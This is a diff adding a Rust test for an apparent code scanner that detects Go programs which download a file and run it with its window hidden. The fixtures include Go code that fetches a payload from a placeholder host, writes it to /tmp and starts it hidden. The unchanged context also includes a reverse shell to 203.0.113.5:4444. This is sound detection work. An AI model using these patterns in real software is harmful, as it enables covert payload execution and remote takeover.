@@ -123,6 +123,27 @@ fn a_download_written_made_executable_and_run() {
 }
 
 #[test]
+fn a_download_run_out_of_sight_says_so() {
+    // GR-8: a payload downloaded, then started with its window hidden or with no console (evm-units' shape)
+    let body = |attr: &str| {
+        format!(
+            "\tresp, err := http.Get(\"https://example.invalid/p\")\n\tif err != nil {{\n\t\treturn\n\t}}\n\tdefer resp.Body.Close()\n\
+             \tf, _ := os.Create(\"/tmp/p\")\n\tio.Copy(f, resp.Body)\n\tf.Close()\n\tcmd := exec.Command(\"/tmp/p\")\n{}\tcmd.Start()\n",
+            attr
+        )
+    };
+    let imports = "\t\"io\"\n\t\"net/http\"\n\t\"os\"\n\t\"os/exec\"\n\t\"syscall\"";
+    for attr in ["\tcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}\n",
+                 "\tcmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}\n"] {
+        let a = init(&body(attr), imports);
+        assert!(has(&start(&a), "downloads a file and then runs it, out of sight"), "{:?}", start(&a));
+    }
+    let a = init(&body(""), imports);
+    let r = start(&a);
+    assert!(has(&r, "downloads a file and then runs it") && !has(&r, "out of sight"), "{:?}", r);
+}
+
+#[test]
 fn a_connection_handed_to_a_shell() {
     let a = init(
         "\tc, err := net.Dial(\"tcp\", \"203.0.113.5:4444\")\n\tif err != nil {\n\t\treturn\n\t}\n\tcmd := exec.Command(\"/bin/sh\")\n\tcmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c\n\tcmd.Run()\n",
